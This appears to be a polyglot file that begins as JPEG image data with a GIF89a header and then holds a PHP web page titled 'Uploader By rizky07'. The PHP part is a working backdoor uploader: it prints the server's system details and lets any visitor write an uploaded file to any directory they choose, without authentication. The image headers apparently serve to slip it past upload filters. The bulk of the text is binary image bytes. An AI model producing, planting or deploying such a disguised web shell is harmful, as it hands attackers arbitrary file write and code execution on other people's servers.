ÿØÿà JFIF      ÿş ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
ÿÛ C 




ÿÛ C		

ÿÀ  P P" ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑğ$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RğbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? û"ŸEîxÊ}è^ğL2[G¨êù'Í-÷vúµEIÆœy¤TcÌrO…õ-okZÚ³Gÿ =_åZè$øi=”×7—ˆ‹m#,1ùÿ ²×¨¢BíZ~1^t±2:}”O)•è¾9ğ\+o6§a–ÑüÓB¿u—ÔW×£Nq©cšQå
(¢¬¤ÿ RÑ@{ı¤K
¬H¿uQTWÏê¬íµW{5{õï°Ûî]­å®àİ®_Ù7¢[¢Š+„é+^D·²£}ÖFS^^û}¸XÜm–Û@úW€²23+.Ö_ájîÂ}£¨´QEwœã)ôRÀ¨KYşËuË÷£‘[şù¯ "u’5aó)İ_>W®|;ÔEç‡"ÏnÆ6Å‰»ÌoIeQ^yÒE+¬Q³1ÂÕóıÕÇÚ®¦™¾ô’3W¬üDÔE‡%Mÿ =ÃÔ:ò:ô0Ñ÷yj¬(¢Ší0şGü–“ş@ü»_…m'öÍÒ†>_Ùşe?ŞÜ»öjâëÕşhâÇD/—spÌÛŸïmşç¯.Zf°øÃğ¥¢Šò³Êş*4ŸÛVjXùfßåQıíÍ»ÿ e®+ş^±ñF[íÜ¤eÍ»Ü¿{oñW”W©BW§c’Ÿğ?à4´WIømæº‘c‚6–Fû«îjêô†Ú•öÙ.ØY'û_3ß5èÚF…c Ûˆláâl|Íşñ­>£Ò¼Ùâdş¦4¿˜ç´_iz.Ù>áå¬ß3WB8£"–¹\œ¾#p¢Š) ‡šçµ¯izÖé"á¿å¬?+WEI‘MIÇáÉµo†Ú•ˆfµ)z‹ò·ıó\”ÖóZÌÑÏE"ıåeÚÕô7AYš¾…c®[˜®áıÙ1ó/Ñ«ª™}£T¿”ÿÙGIF89a=<!DOCTYPE html>
<html>
<title>Uploader By rizky07</title>
<body >
<center>
<?
echo "<h3 style='margin-top:0;margin-bottom:5px'>".php_uname()."</h3>";
?>
<form action="" method="post" enctype="multipart/form-data">
   <input type="text" style="padding:5px;border:1px solid green;width:303px;margin-bottom:4px" name="dir"  placeholder="directory">
   <input type="file" style="padding:3px;background-color:green;color:white;margin-bottom:4px" name="file" >
    <input type="submit" style="padding:3px;border:3px solid green;background-color:green;color:white;margin-bottom:4px" value="UPLOAD" name="submit">
</form>
<?
if(isset($_POST['submit'])) {
$target_dir = $_POST['dir'];
$target_file = $target_dir . basename($_FILES["file"]["name"]);

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "Yosh ! ". basename( $_FILES["file"]["name"]). " UPLOAD > OK";
    } else {
        echo "Anjing, upload gagal !";
    }
  }

?> 
</body>
</html>
